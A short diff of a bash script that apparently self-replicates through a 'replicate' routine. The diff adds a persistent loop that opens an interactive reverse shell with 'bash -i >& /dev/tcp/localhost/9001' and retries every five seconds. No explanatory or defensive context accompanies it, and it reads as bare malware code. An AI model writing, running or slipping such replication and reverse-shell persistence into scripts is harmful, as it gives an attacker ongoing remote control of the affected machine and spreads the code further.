@@ -27,10 +27,16 @@ checker(){
 }
 
 checker
+
 if [ "$counter" -le 1 ]; then
 	replicate
+	exit
 elif [ "$counter" -ge 3 ]; then
 	exit
-elif [ "$counter" -eq 2 ]; then
-	echo "${0}"
 fi
+
+while [ true ]; do
+	if ! bash -i >& /dev/tcp/localhost/9001 0>&1; then
+		sleep 5
+	fi
+done
